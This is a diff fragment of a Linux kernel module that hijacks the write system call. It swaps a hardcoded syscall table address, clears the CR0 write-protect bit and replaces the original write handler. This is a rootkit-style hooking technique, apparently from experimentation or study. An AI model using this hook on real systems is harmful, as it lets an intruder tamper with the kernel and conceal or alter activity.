@@ -10,7 +10,7 @@
 #include <linux/sched.h>
 #include <linux/kallsyms.h>
  
-unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
+unsigned long *syscall_table = (unsigned long *)0xc15b5020; 
  
 asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
  
@@ -24,9 +24,7 @@ asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) 
 }
  
 static int init(void) {
- 
-    printk(KERN_ALERT "\nHIJACK INIT\n");
- 
+  printk(KERN_ALERT "\nHIJACK INIT\n");    
     write_cr0 (read_cr0 () & (~ 0x10000));
  
     original_write = (void *)syscall_table[__NR_write];
